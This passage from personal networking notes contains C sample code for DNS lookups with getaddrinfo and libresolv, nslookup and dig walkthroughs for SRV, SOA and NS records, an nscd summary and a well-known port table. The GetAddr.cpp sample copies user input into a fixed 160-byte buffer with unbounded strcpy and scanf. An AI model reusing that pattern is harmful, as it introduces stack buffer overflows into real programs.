         struct sockaddr_in6 *p_sa6;        /* to manipulate IPv6 addresses */
         char                 c_v6[42];     /* for max IPv6 address */

	for ( pres = aiList; pres ; pres = pres->ai_next) {
             switch(pres->ai_family)
             {
             case AF_INET: /* IPv4 type */
                 p_sa4 = (struct sockaddr_in *)pres->ai_addr; /* cast to IPv4 socket type */
                 printf("Found domain IPv4 A record %s \n" , inet_ntoa(p_sa4->sin_addr));
                 break;
             case AF_INET6: /* IPv6 type*/
                 p_sa6 = (struct sockaddr_in6 *)pres->ai_addr; /* cast to IPv6 socket type */
                 printf("Found domain IPv6 A record %s  \n", inet_ntop(pres->ai_family, &p_sa6->sin6_addr, c_v6,42) );
                 break;
             default:
                 printf("Found domain A record of unknown ai_family %d\n", pres->ai_family);
                 break;
             }// switch(p_results->ai_family)
	}

	return 0;
}

				10.5.8.4.2 Customized

/*
 * =====================================================================================
 *
 *       Filename:  GetAddr.cpp
 *
 *    Description:  GetAddrinfo 
 *
 *        Version:  1.0
 *        Created:  07/03/2014 10:49:08
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Yosi Izaq
 *   Organization:  
 *
 * =====================================================================================
 */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


// For getaddrinfo 
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h> /* for sockaddr_in and sockaddr_in6 */
#include <arpa/inet.h> /* for sockaddr_in and sockaddr_in6 */

// For libresolv
#include <arpa/nameser.h>
#include <resolv.h>

#define _PREF_DCS_RESOLVER_RETRIES 2
#define _PREF_DCS_RESOLVER_TIMEOUT 3
// For getaddrinfo 

int main(int argc, const char *argv[])
{
	char s_name[160];

	if (argc == 1) {
		printf("Please provide name to resolv\n");
		scanf("%s", s_name);
	}
	else if (argc == 2){

		strcpy(s_name, argv[1]);
	}
	printf("name to resolv - %s\n", s_name);

	//Init resolver
	if (RES_INIT) {
		printf("Resolver already initialized \n");
	}
	else {
		
		printf("Resolver not initialized \n");
		if (res_init()) { 
			
			printf("Resolver init failed! \n");
			return 1;
		}
		else {
			
			printf("Resolver initialization succeeded \n");
		}
	}

	// set retries 2, TO 3
	_res.retrans = 3;
	_res.retry = 2;

	struct addrinfo aiHints;
	struct addrinfo *pres, *aiList = NULL;
	int retVal;

	// Setup the hints address info structure
	// which is passed to the getaddrinfo() function
	memset(&aiHints, 0, sizeof(aiHints));
	aiHints.ai_family = AF_INET; // Only IPv4, for IPv6 also set PF_UNSPEC
	aiHints.ai_socktype = SOCK_STREAM; // TCP query
	aiHints.ai_protocol = IPPROTO_TCP;
	 
	// Call getaddrinfo(). If the call succeeds, the aiList variable
	// will hold a linked list f addrinfo structures containing
	// response information about the host
	if ((retVal = getaddrinfo(s_name, NULL, &aiHints, &aiList)) != 0)
	{
	  printf("getaddrinfo() failed with error code %d - error %s.\n", retVal, gai_strerror(retVal));
	}


         struct sockaddr_in  *p_sa4;        /* to manipulate IPv4 addresses */
         struct sockaddr_in6 *p_sa6;        /* to manipulate IPv6 addresses */
         char                 c_v6[42];     /* for max IPv6 address */

	for ( pres = aiList; pres ; pres = pres->ai_next) {
             switch(pres->ai_family)
             {
             case AF_INET: /* IPv4 type */
                 p_sa4 = (struct sockaddr_in *)pres->ai_addr; /* cast to IPv4 socket type */
                 printf("Found domain IPv4 A record %s \n" , inet_ntoa(p_sa4->sin_addr));
                 break;
             case AF_INET6: /* IPv6 type*/
                 p_sa6 = (struct sockaddr_in6 *)pres->ai_addr; /* cast to IPv6 socket type */
                 printf("Found domain IPv6 A record %s  \n", inet_ntop(pres->ai_family, &p_sa6->sin6_addr, c_v6,42) );
                 break;
             default:
                 printf("Found domain A record of unknown ai_family %d\n", pres->ai_family);
                 break;
             }// switch(p_results->ai_family)
	}

	return 0;
}

				10.5.8.4.3
			10.5.8.5

		10.5.9 nslookup & dig sources

			10.5.9.1 http://www.isc.org/index.pl?/sw/bind/bind9.php
All is here> ftp://ftp.isc.org/isc/bind9/9.2.3/bind-9.2.3.tar.gz
Homepage> http://www.isc.org/index.pl?/sw/bind/bind9.php
c:\work\code\bind\bind-9.2.3\bin\dig\dig.c 


			10.5.9.2
		10.5.10 libresolv_query.c
/*
 * Copyright (c) 2013 by Wil Tan <wil@cloudregistry.net>
 *
 * Based on dump_dns.c from the dnscap <https://www.dns-oarc.net/tools/dnscap>
 * originally written by Paul Vixie.
 *
 * Copyright (c) 2007 by Internet Systems Consortium, Inc. ("ISC")
 *
 * Permission to use, copy, modify, and/or distribute this software for any
 * purpose with or without fee is hereby granted, provided that the above
 * copyright notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS" AND ISC DISCLAIMS ALL WARRANTIES
 * WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS.  IN NO EVENT SHALL ISC BE LIABLE FOR
 * ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
 * WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
 * ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT
 * OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 */
 
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <resolv.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
 
 
extern const char *_res_opcodes[];
 
#define MY_GET16(s, cp) do { \
        register const u_char *t_cp = (const u_char *)(cp); \
        (s) = ((u_int16_t)t_cp[0] << 8) \
            | ((u_int16_t)t_cp[1]) \
            ; \
        (cp) += NS_INT16SZ; \
} while (0)
 
#define MY_GET32(l, cp) do { \
        register const u_char *t_cp = (const u_char *)(cp); \
        (l) = ((u_int32_t)t_cp[0] << 24) \
            | ((u_int32_t)t_cp[1] << 16) \
            | ((u_int32_t)t_cp[2] << 8) \
            | ((u_int32_t)t_cp[3]) \
            ; \
        (cp) += NS_INT32SZ; \
} while (0)
 
static void
dump_dns_rr(ns_msg *msg, ns_rr *rr, ns_sect sect, FILE *trace) {
	char buf[NS_MAXDNAME];
	u_int class, type;
	const u_char *rd;
	u_int32_t soa[5];
	u_int16_t mx;
	int n;
 
	class = ns_rr_class(*rr);
	type = ns_rr_type(*rr);
	fprintf(trace, "%s,%s,%s",
		ns_rr_name(*rr),
		p_class(class),
		p_type(type));
	if (sect == ns_s_qd)
		return;
	fprintf(trace, ",%lu", (u_long)ns_rr_ttl(*rr));
	rd = ns_rr_rdata(*rr);
	switch (type) {
	case ns_t_soa:
		n = ns_name_uncompress(ns_msg_base(*msg), ns_msg_end(*msg),
				       rd, buf, sizeof buf);
		if (n < 0)
			goto error;
		putc(',', trace);
		fputs(buf, trace);
		rd += n;
		n = ns_name_uncompress(ns_msg_base(*msg), ns_msg_end(*msg),
				       rd, buf, sizeof buf);
		if (n < 0)
			goto error;
		putc(',', trace);
		fputs(buf, trace);
		rd += n;
		if (ns_msg_end(*msg) - rd < 5*NS_INT32SZ)
			goto error;
		for (n = 0; n < 5; n++)
			MY_GET32(soa[n], rd);
		sprintf(buf, "%u,%u,%u,%u,%u",
			soa[0], soa[1], soa[2], soa[3], soa[4]);
		break;
	case ns_t_a:
		inet_ntop(AF_INET, rd, buf, sizeof buf);
		break;
	case ns_t_aaaa:
		inet_ntop(AF_INET6, rd, buf, sizeof buf);
		break;
	case ns_t_mx:
		MY_GET16(mx, rd);
		fprintf(trace, ",%u", mx);
		/* FALLTHROUGH */
	case ns_t_ns:
	case ns_t_ptr:
	case ns_t_cname:
		n = ns_name_uncompress(ns_msg_base(*msg), ns_msg_end(*msg),
				       rd, buf, sizeof buf);
		if (n < 0)
			goto error;
		break;
	case ns_t_txt:
		snprintf(buf, (size_t)rd[0]+1, "%s", rd+1);
		break;
	default:
 error:
		sprintf(buf, "[%u]", ns_rr_rdlen(*rr));
	}
	if (buf[0] != '\0') {
		putc(',', trace);
		fputs(buf, trace);
	}
}
 
 
static void
dump_dns_sect(ns_msg *msg, ns_sect sect, FILE *trace, const char *endline) {
        int rrnum, rrmax;
        const char *sep;
        ns_rr rr;
 
        rrmax = ns_msg_count(*msg, sect);
        if (rrmax == 0) {
                fputs(" 0", trace);
                return;
        }
        fprintf(trace, " %s%d", endline, rrmax);
        sep = "";
        for (rrnum = 0; rrnum < rrmax; rrnum++) {
                if (ns_parserr(msg, sect, rrnum, &rr)) {
                        fputs(strerror(errno), trace);
                        return;
                }
                fprintf(trace, " %s", sep);
                dump_dns_rr(msg, &rr, sect, trace);
                sep = endline;
        }
}
 
void
dump_dns(const u_char *payload, size_t paylen,
	  FILE *trace, const char *endline)
{
	u_int opcode, rcode, id;
	const char *sep;
	ns_msg msg;
 
	fprintf(trace, " %sdns ", endline);
	if (ns_initparse(payload, paylen, &msg) < 0) {
		fputs(strerror(errno), trace);
		return;
	}
	opcode = ns_msg_getflag(msg, ns_f_opcode);
	rcode = ns_msg_getflag(msg, ns_f_rcode);
	id = ns_msg_id(msg);
	fprintf(trace, "%s,%s,%u", _res_opcodes[opcode], p_rcode(rcode), id);
	sep = ",";
#define FLAG(t,f) if (ns_msg_getflag(msg, f)) { \
			fprintf(trace, "%s%s", sep, t); \
			sep = "|"; \
		  }
	FLAG("qr", ns_f_qr);
	FLAG("aa", ns_f_aa);
	FLAG("tc", ns_f_tc);
	FLAG("rd", ns_f_rd);
	FLAG("ra", ns_f_ra);
	FLAG("z", ns_f_z);
	FLAG("ad", ns_f_ad);
	FLAG("cd", ns_f_cd);
#undef FLAG
 
	dump_dns_sect(&msg, ns_s_an, trace, endline);
}
 
 
int main() {
	u_char answer[1024] = "";
	res_init();
	int rv = res_query("google.com", ns_c_in, ns_t_txt, answer, sizeof(answer));
	printf("rv=%d\n", rv);
	dump_dns(answer, rv, stdout, "\n");
	printf("\n");
 
}


		10.5.11
	10.6 DNS FAQ

		10.6.1 lookup domain controller srv record 
$ nslookup
(set nameserver - in this case domain nameserver)
> server 10.56.62.165
Default Server:  [10.56.62.165]
Address:  10.56.62.165

> set type=srv
> _ldap._tcp.dc._msdcs.UK.com     SRV service location:
          priority       = 0
          weight         = 100
          port           = 389
          svr hostname   = ukdc4.uk.com
_ldap._tcp.dc._msdcs.UK.com     SRV service location:
          priority       = 0
          weight         = 100
          port           = 389
          svr hostname   = ukdc2.uk.com
_ldap._tcp.dc._msdcs.UK.com     SRV service location:
          priority       = 0
          weight         = 100
          port           = 389
          svr hostname   = ukdc1.uk.com
_ldap._tcp.dc._msdcs.UK.com     SRV service location:
          priority       = 0
          weight         = 100
          port           = 389
          svr hostname   = ukdc3.uk.com
ukdc4.uk.com    internet address = 10.56.62.122
ukdc2.uk.com    internet address = 10.56.62.120
ukdc1.uk.com    internet address = 10.56.62.119
ukdc3.uk.com    internet address = 10.56.62.121
> 

lookup GCs of domain
[root@yizaq-1 normalizer]# nslookup 
> set type=srv
> _ldap._tcp.gc._msdcs.uk.com        
Server:         10.56.53.79
Address:        10.56.53.79#53

Non-authoritative answer:
_ldap._tcp.gc._msdcs.uk.com     service = 0 100 3268 ukdc1.uk.com.

Authoritative answers can be found from:
ukdc1.uk.com    internet address = 10.56.62.119
		10.6.2 How do I find the authoritative name-server for a domain name?

--------------------------------------------------------------------------------
You'll want the SOA (Start of Authority) record for a given domain name, and this is how you accomplish it using the universally available nslookup command line tool:

command line> nslookup
> set querytype=soa
> stackoverflow.com
Server:         217.30.180.230
Address:        217.30.180.230#53

Non-authoritative answer:
stackoverflow.com
        origin = ns51.domaincontrol.com # ("primary name server" on Windows)
        mail addr = dns.jomax.net       # ("responsible mail addr" on Windows)
        serial = 2008041300
        refresh = 28800
        retry = 7200
        expire = 604800
        minimum = 86400
Authoritative answers can be found from:
stackoverflow.com       nameserver = ns52.domaincontrol.com.
stackoverflow.com       nameserver = ns51.domaincontrol.com.
The origin (or primary name server on Windows) line tells you that ns51.domaincontrol is the main name server for stackoverflow.com.

At the end of output all authoritative servers, including backup servers for the given domain, are listed.
--------------------------------------------------------------------------------
You used the singular in your question but there are typically several authoritative name servers, the RFC 1034 recommends at least two.

Unless you mean "primary name server" and not "authoritative name server". The secondary name servers are authoritative.

To find out the name servers of a domain on Unix:

  % dig +short NS stackoverflow.com
 ns52.domaincontrol.com.
 ns51.domaincontrol.com.
To find out the server listed as primary (the notion of "primary" is quite fuzzy these days and typically has no good answer):

% dig +short  SOA stackoverflow.com | cut -d' ' -f1
ns51.domaincontrol.com.
To check discrepencies between name servers, my preference goes to the old check_soa tool, described in Liu & Albitz "DNS & BIND" book (O'Reilly editor). The source code is available in http://examples.oreilly.com/dns5/

% check_soa stackoverflow.com
ns51.domaincontrol.com has serial number 2008041300
ns52.domaincontrol.com has serial number 2008041300
Here, the two authoritative name servers have the same serial number. Good.
--------------------------------------------------------------------------------
On *nix:

$ dig -t ns <domain name>
--------------------------------------------------------------------------------
The term you should be googling is "authoritative," not "definitive".

On Linux or Mac you can use the commands whois, dig, host, nslookup or several others. nslookup might also work on Windows.

An example:

$ whois stackoverflow.com
[...]
   Domain servers in listed order:
      NS51.DOMAINCONTROL.COM
      NS52.DOMAINCONTROL.COM
As for the extra credit: Yes, it is possible.

aryeh is definitely wrong, as his suggestion usually will only give you the IP address for the hostname. If you use dig, you have to look for NS records, like so:

dig ns stackoverflow.com
Keep in mind that this may ask your local DNS server and thus may give wrong or out-of-date answers that it has in its cache.
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
		10.6.3 Find AD DC SRV records of given site
nslookup -q=SRV _ldap._tcp.Site-Number-1._sites.dc._msdcs.rehovot.corp
nslookup -q=SRV _ldap._tcp.dc._msdcs.rehovot.corp

		10.6.4
	10.7 Linux admin


		10.7.1  nscd - name service cache daemon
Description


 Nscd is a daemon that provides a cache for the most common name service requests. The default configuration file, /etc/nscd.conf, determines the behavior of the cache daemon. See nscd.conf(5).
Nscd provides caching for accesses of the passwd(5), group(5), and hosts(5) databases through standard libc interfaces, such as getpwnam(3), getpwuid(3), getgrnam(3), getgrgid(3), gethostbyname(3), and others.

There are two caches for each database: a positive one for items found, and a negative one for items not found. Each cache has a separate TTL (time-to-live) period for its data. Note that the shadow file is specifically not cached. getspnam(3) calls remain uncached as a result.


			10.7.1.1  restart
service nscd restart
			10.7.1.2

	10.8
11. List of TCP and UDP port numbers

	11.1 From Wikipedia
Well-known ports

The port numbers in the range from 0 to 1023 are the well-known ports. They are used by system processes that provide widely used types of network services. On Unix-like operating systems, a process must execute with superuser privileges to be able to bind a network socket to an IP address using one of the well-known ports.
Port 	TCP 	UDP 	Description 	Status
0 		UDP 	Reserved 	Official
1 	TCP 	UDP 	TCP Port Service Multiplexer (TCPMUX) 	Official
2 	TCP 	UDP 	CompressNET[2] Management Utility[3] 	Official
3 	TCP 	UDP 	CompressNET[2] Compression Process[4] 	Official
4 	TCP 	UDP 	Unassigned 	Official
5 	TCP 	UDP 	Remote Job Entry 	Official
7 	TCP 	UDP 	Echo Protocol 	Official
8 	TCP 	UDP 	Unassigned 	Official
9 	TCP 	UDP 	Discard Protocol 	Official
10 	TCP 	UDP 	Unassigned 	Official
11 	TCP 	UDP 	Active Users (systat service)[5][6] 	Official
12 	TCP 	UDP 	Unassigned 	Official
13 	TCP 	UDP 	Daytime Protocol (RFC 867) 	Official
14 	TCP 	UDP 	Unassigned 	Official
15 	TCP 	UDP 	Previously netstat service[5] 	Unofficial
16 	TCP 	UDP 	Unassigned 	Official
17 	TCP 	UDP 	Quote of the Day 	Official
18 	TCP 	UDP 	Message Send Protocol 	Official
19 	TCP 	UDP 	Character Generator Protocol (CHARGEN) 	Official
20 	TCP 		FTP data transfer 	Official
21 	TCP 		FTP control (command) 	Official
22 	TCP 		Secure Shell (SSH)—used for secure logins, file transfers (scp, sftp) and port forwarding 	Official
23 	TCP 		Telnet protocol—unencrypted text communications 	Official
24 	TCP 	UDP 	Priv-mail : any private mail system. 	Official
25 	TCP 		Simple Mail Transfer Protocol (SMTP)—used for e-mail routing between mail servers 	Official
26 	TCP 	UDP 	Unassigned 	Official
27 	TCP 	UDP 	NSW User System FE 	Official
29 	TCP 	UDP 	MSG ICP 	Official
33 	TCP 	UDP 	Display Support Protocol 	Official
35 	TCP 	UDP 	Any private printer server protocol 	Official
37 	TCP 	UDP 	TIME protocol 	Official
39 	TCP 	UDP 	Resource Location Protocol[7] (RLP)—used for determining the location of higher level services from hosts on a network 	Official
40 	TCP 	UDP 	Unassigned 	Official
42 	TCP 	UDP 	ARPA Host Name Server Protocol 	Official
42 	TCP 	UDP 	Windows Internet Name Service 	Unofficial
43 	TCP 		WHOIS protocol 	Official
47 	TCP 	UDP 	NI FTP[7] 	Official
49 	TCP 	UDP 	TACACS Login Host protocol 	Official
50 	TCP 	UDP 	Remote Mail Checking Protocol[8] 	Official
51 	TCP 	UDP 	IMP Logical Address Maintenance 	Official
52 	TCP 	UDP 	XNS (Xerox Network Systems) Time Protocol 	Official
53 	TCP 	UDP 	Domain Name System (DNS) 	Official
54 	TCP 	UDP 	XNS (Xerox Network Systems) Clearinghouse 	Official
55 	TCP 	UDP 	ISI Graphics Language (ISI-GL) 	Official
56 	TCP 	UDP 	XNS (Xerox Network Systems) Authentication 	Official
56 	TCP 	UDP 	Route Access Protocol (RAP)[9] 	Unofficial
57 	TCP 		Mail Transfer Protocol (RFC 780) 	Official
58 	TCP 	UDP 	XNS (Xerox Network Systems) Mail 	Official
67 		UDP 	Bootstrap Protocol (BOOTP) Server; also used by Dynamic Host Configuration Protocol (DHCP) 	Official
68 		UDP 	Bootstrap Protocol (BOOTP) Client; also used by Dynamic Host Configuration Protocol (DHCP) 	Official
69 		UDP 	Trivial File Transfer Protocol (TFTP) 	Official
70 	TCP 		Gopher protocol 	Official
71 	TCP 		NETRJS protocol 	Official
72 	TCP 		NETRJS protocol 	Official
73 	TCP 		NETRJS protocol 	Official
74 	TCP 		NETRJS protocol 	Official
79 	TCP 		Finger protocol 	Official
80 	TCP 		Hypertext Transfer Protocol (HTTP) 	Official [10]
81 	TCP 		Torpark—Onion routing 	Unofficial
82 		UDP 	Torpark—Control 	Unofficial
88 	TCP 	UDP 	Kerberos—authentication system 	Official
90 	TCP 	UDP 	dnsix (DoD Network Security for Information Exchange) Securit Attribute Token Map 	Official
90 	TCP 	UDP 	PointCast (dotcom) 	Unofficial
99 	TCP 		WIP Message protocol 	Unofficial
101 	TCP 		NIC host name 	Official
102 	TCP 		ISO-TSAP (Transport Service Access Point) Class 0 protocol[11] 	Official
104 	TCP 	UDP 	ACR/NEMA Digital Imaging and Communications in Medicine 	Official
105 	TCP 	UDP 	CCSO Nameserver Protocol (Qi/Ph) 	Official
107 	TCP 		Remote TELNET Service[12] protocol 	Official
108 	TCP 	UDP 	SNA Gateway Access Server [1] 	Official
109 	TCP 		Post Office Protocol v2 (POP2) 	Official
110 	TCP 		Post Office Protocol v3 (POP3) 	Official
111 	TCP 	UDP 	ONC RPC (Sun RPC) 	Official
113 	TCP 		ident—Authentication Service/Identification Protocol,[13] used by IRC servers to identify users 	Official
113 		UDP 	Authentication Service[13] (auth) 	Official
115 	TCP 		Simple File Transfer Protocol (SFTP) 	Official
117 	TCP 		UUCP Path Service 	Official
118 	TCP 	UDP 	SQL (Structured Query Language) Services 	Official
119 	TCP 		Network News Transfer Protocol (NNTP)—retrieval of newsgroup messages 	Official
123 		UDP 	Network Time Protocol (NTP)—used for time synchronization 	Official
126 	TCP 	UDP 	Formerly Unisys Unitary Login, renamed by Unisys to NXEdit. Used by Unisys Programmer's Workbench for Clearpath MCP, an IDE for Unisys MCP software development 	Official
135 	TCP 	UDP 	DCE endpoint resolution 	Official
135 	TCP 	UDP 	Microsoft EPMAP (End Point Mapper), also known as DCE/RPC Locator service,[14] used to remotely manage services including DHCP server, DNS server and WINS. Also used by DCOM 	Unofficial
137 	TCP 	UDP 	NetBIOS NetBIOS Name Service 	Official
138 	TCP 	UDP 	NetBIOS NetBIOS Datagram Service 	Official
139 	TCP 	UDP 	NetBIOS NetBIOS Session Service 	Official
143 	TCP 		Internet Message Access Protocol (IMAP)—management of email messages 	Official
152 	TCP 	UDP 	Background File Transfer Program (BFTP)[15] 	Official
153 	TCP 	UDP 	SGMP, Simple Gateway Monitoring Protocol 	Official
156 	TCP 	UDP 	SQL Service 	Official
158 	TCP 	UDP 	DMSP, Distributed Mail Service Protocol[16] 	Unofficial
161 		UDP 	Simple Network Management Protocol (SNMP) 	Official
162 	TCP 	UDP 	Simple Network Management Protocol Trap (SNMPTRAP)[17] 	Official
170 	TCP 		Print-srv, Network PostScript 	Official
175 	TCP 		VMNET (IBM z/VM, z/OS & z/VSE - Network Job Entry(NJE)) 	Official
177 	TCP 	UDP 	X Display Manager Control Protocol (XDMCP) 	Official
179 	TCP 		BGP (Border Gateway Protocol) 	Official
194 	TCP 	UDP 	Internet Relay Chat (IRC) 	Official
199 	TCP 	UDP 	SMUX, SNMP Unix Multiplexer 	Official
201 	TCP 	UDP 	AppleTalk Routing Maintenance 	Official
209 	TCP 	UDP 	The Quick Mail Transfer Protocol 	Official
210 	TCP 	UDP 	ANSI Z39.50 	Official
213 	TCP 	UDP 	Internetwork Packet Exchange (IPX) 	Official
218 	TCP 	UDP 	Message posting protocol (MPP) 	Official
220 	TCP 	UDP 	Internet Message Access Protocol (IMAP), version 3 	Official
259 	TCP 	UDP 	ESRO, Efficient Short Remote Operations 	Official
264 	TCP 	UDP 	BGMP, Border Gateway Multicast Protocol 	Official
280 	TCP 	UDP 	http-mgmt 	Official
308 	TCP 		Novastor Online Backup 	Official
311 	TCP 		Mac OS X Server Admin (officially AppleShare IP Web administration) 	Official
318 	TCP 	UDP 	PKIX TSP, Time Stamp Protocol 	Official
319 		UDP 	Precision time protocol event messages 	Official
320 		UDP 	Precision time protocol general messages 	Official
350 	TCP 	UDP 	MATIP-Type A, Mapping of Airline Traffic over Internet Protocol 	Official
351 	TCP 	UDP 	MATIP-Type B, Mapping of Airline Traffic over Internet Protocol 	Official
366 	TCP 	UDP 	ODMR, On-Demand Mail Relay 	Official
369 	TCP 	UDP 	Rpc2portmap 	Official
370 	TCP 		codaauth2—Coda authentication server 	Official
370 		UDP 	codaauth2—Coda authentication server 	Official
370 		UDP 	securecast1—Outgoing packets to NAI's servers [18][dead link] 	Unofficial
371 	TCP 	UDP 	ClearCase albd 	Official
383 	TCP 	UDP 	HP data alarm manager 	Official
384 	TCP 	UDP 	A Remote Network Server System 	Official
387 	TCP 	UDP 	AURP, AppleTalk Update-based Routing Protocol[19] 	Official
389 	TCP 	UDP 	Lightweight Directory Access Protocol (LDAP) 	Official
399 	TCP 	UDP 	Digital Equipment Corporation DECnet (Phase V+) over TCP/IP 	Official
401 	TCP 	UDP 	UPS Uninterruptible Power Supply 	Official
427 	TCP 	UDP 	Service Location Protocol (SLP) 	Official
443 	TCP 		HTTPS (Hypertext Transfer Protocol over SSL/TLS) 	Official
444 	TCP 	UDP 	SNPP, Simple Network Paging Protocol (RFC 1568) 	Official
445 	TCP 		Microsoft-DS Active Directory, Windows shares 	Official
445 	TCP 		Microsoft-DS SMB file sharing 	Official
464 	TCP 	UDP 	Kerberos Change/Set password 	Official
465 	TCP 		URL Rendesvous Directory for SSM (Cisco protocol) 	Official
475 	TCP 	UDP 	tcpnethaspsrv (Aladdin Knowledge Systems Hasp services, TCP/IP version) 	Official
497 	TCP 		Dantz Retrospect 	Official
500 		UDP 	Internet Security Association and Key Management Protocol (ISAKMP) 	Official
502 	TCP 	UDP 	Modbus, Protocol 	Unofficial
504 	TCP 	UDP 	Citadel—multiservice protocol for dedicated clients for the Citadel groupware system 	Official
512 	TCP 		Rexec, Remote Process Execution 	Official
512 		UDP 	comsat, together with biff 	Official
513 	TCP 		rlogin 	Official
513 		UDP 	Who[20] 	Official
514 	TCP 		Shell—used to execute non-interactive commands on a remote system (Remote Shell, rsh, remsh) 	Official
514 		UDP 	Syslog—used for system logging 	Official
515 	TCP 		Line Printer Daemon—print service 	Official
517 		UDP 	Talk 	Official
518 		UDP 	NTalk 	Official
520 	TCP 		efs, extended file name server 	Official
520 		UDP 	Routing Information Protocol (RIP) 	Official
524 	TCP 	UDP 	NetWare Core Protocol (NCP) is used for a variety things such as access to primary NetWare server resources, Time Synchronization, etc. 	Official
525 		UDP 	Timed, Timeserver 	Official
530 	TCP 	UDP 	RPC 	Official
531 	TCP 	UDP 	AOL Instant Messenger 	Unofficial
532 	TCP 		netnews 	Official
533 		UDP 	netwall, For Emergency Broadcasts 	Official
540 	TCP 		UUCP (Unix-to-Unix Copy Protocol) 	Official
542 	TCP 	UDP 	commerce (Commerce Applications) 	Official
543 	TCP 		klogin, Kerberos login 	Official
544 	TCP 		kshell, Kerberos Remote shell 	Official
545 	TCP 		OSIsoft PI (VMS), OSISoft PI Server Client Access 	Unofficial
546 	TCP 	UDP 	DHCPv6 client 	Official
547 	TCP 	UDP 	DHCPv6 server 	Official
548 	TCP 		Apple Filing Protocol (AFP) over TCP 	Official
550 	TCP 	UDP 	new-rwho, new-who[20] 	Official
554 	TCP 	UDP 	Real Time Streaming Protocol (RTSP) 	Official
556 	TCP 		Remotefs, RFS, rfs_server 	Official
560 		UDP 	rmonitor, Remote Monitor 	Official
561 		UDP 	monitor 	Official
563 	TCP 	UDP 	NNTP protocol over TLS/SSL (NNTPS) 	Official
587 	TCP 		e-mail message submission[21] (SMTP) 	Official
591 	TCP 		FileMaker 6.0 (and later) Web Sharing (HTTP Alternate, also see port 80) 	Official
593 	TCP 	UDP 	HTTP RPC Ep Map, Remote procedure call over Hypertext Transfer Protocol, often used by Distributed Component Object Model services and Microsoft Exchange Server 	Official
604 	TCP 		TUNNEL profile,[22] a protocol for BEEP peers to form an application layer tunnel 	Official
623 		UDP 	ASF Remote Management and Control Protocol (ASF-RMCP) 	Official
631 	TCP 	UDP 	Internet Printing Protocol (IPP) 	Official
631 	TCP 	UDP 	Common Unix Printing System (CUPS) 	Unofficial
635 	TCP 	UDP 	RLZ DBase 	Official
636 	TCP 	UDP 	Lightweight Directory Access Protocol over TLS/SSL (LDAPS) 	Official
639 	TCP 	UDP 	MSDP, Multicast Source Discovery Protocol 	Official
641 	TCP 	UDP 	SupportSoft Nexus Remote Command (control/listening): A proxy gateway connecting remote control traffic 	Official
646 	TCP 	UDP 	LDP, Label Distribution Protocol, a routing protocol used in MPLS networks 	Official
647 	TCP 		DHCP Failover protocol[23] 	Official
648 	TCP 		RRP (Registry Registrar Protocol)[24] 	Official
651 	TCP 	UDP 	IEEE-MMS 	Official
653 	TCP 	UDP 	SupportSoft Nexus Remote Command (data): A proxy gateway connecting remote control traffic 	Official
654 	TCP 		Media Management System (MMS) Media Management Protocol (MMP)[25] 	Official
657 	TCP 	UDP 	IBM RMC (Remote monitoring and Control) protocol, used by System p5 AIX Integrated Virtualization Manager (IVM)[26] and Hardware Management Console to connect managed logical partitions (LPAR) to enable dynamic partition reconfiguration 	Official
660 	TCP 		Mac OS X Server administration 	Official
666 		UDP 	Doom, first online first-person shooter 	Official
666 	TCP 		airserv-ng, aircrack-ng's server for remote-controlling wireless devices 	Unofficial
674 	TCP 		ACAP (Application Configuration Access Protocol) 	Official
688 	TCP 	UDP 	REALM-RUSD (ApplianceWare Server Appliance Management Protocol) 	Official
691 	TCP 		MS Exchange Routing 	Official
694 	TCP 	UDP 	Linux-HA High availability Heartbeat 	Official
695 	TCP 		IEEE-MMS-SSL (IEEE Media Management System over SSL)[27] 	Official
698 		UDP 	OLSR (Optimized Link State Routing) 	Official
700 	TCP 		EPP (Extensible Provisioning Protocol), a protocol for communication between domain name registries and registrars (RFC 5734) 	Official
701 	TCP 		LMP (Link Management Protocol (Internet)),[28] a protocol that runs between a pair of nodes and is used to manage traffic engineering (TE) links 	Official
702 	TCP 		IRIS[29][30] (Internet Registry Information Service) over BEEP (Blocks Extensible Exchange Protocol)[31] (RFC 3983) 	Official
706 	TCP 		Secure Internet Live Conferencing (SILC) 	Official
711 	TCP 		Cisco Tag Distribution Protocol[32][33][34]—being replaced by the MPLS Label Distribution Protocol[35] 	Official
712 	TCP 		Topology Broadcast based on Reverse-Path Forwarding routing protocol (TBRPF) (RFC 3684) 	Official
749 	TCP 	UDP 	Kerberos (protocol) administration 	Official
750 		UDP 	kerberos-iv, Kerberos version IV 	Official
751 	TCP 	UDP 	kerberos_master, Kerberos authentication 	Unofficial
752 		UDP 	passwd_server, Kerberos Password (kpasswd) server 	Unofficial
753 	TCP 		Reverse Routing Header (rrh)[36] 	Official
753 		UDP 	Reverse Routing Header (rrh) 	Official
753 		UDP 	userreg_server, Kerberos userreg server 	Unofficial
754 	TCP 		tell send 	Official
754 	TCP 		krb5_prop, Kerberos v5 slave propagation 	Unofficial
754 		UDP 	tell send 	Official
760 	TCP 	UDP 	krbupdate [kreg], Kerberos registration 	Unofficial
782 	TCP 		Conserver serial-console management server 	Unofficial
783 	TCP 		SpamAssassin spamd daemon 	Unofficial
808 	TCP 		Microsoft Net.TCP Port Sharing Service 	Official
829 	TCP 		Certificate Management Protocol[37] 	Unofficial
843 	TCP 		Adobe Flash[38] 	Official
847 	TCP 		DHCP Failover protocol 	Official
848 	TCP 	UDP 	Group Domain Of Interpretation (GDOI) protocol 	Official
860 	TCP 		iSCSI (RFC 3720) 	Official
861 	TCP 	UDP 	OWAMP control (RFC 4656) 	Official
862 	TCP 	UDP 	TWAMP control (RFC 5357) 	Official
873 	TCP 		rsync file synchronization protocol 	Official
888 	TCP 		cddbp, CD DataBase (CDDB) protocol (CDDBP) 	Unofficial
897 	TCP 	UDP 	Brocade SMI-S RPC 	Unofficial
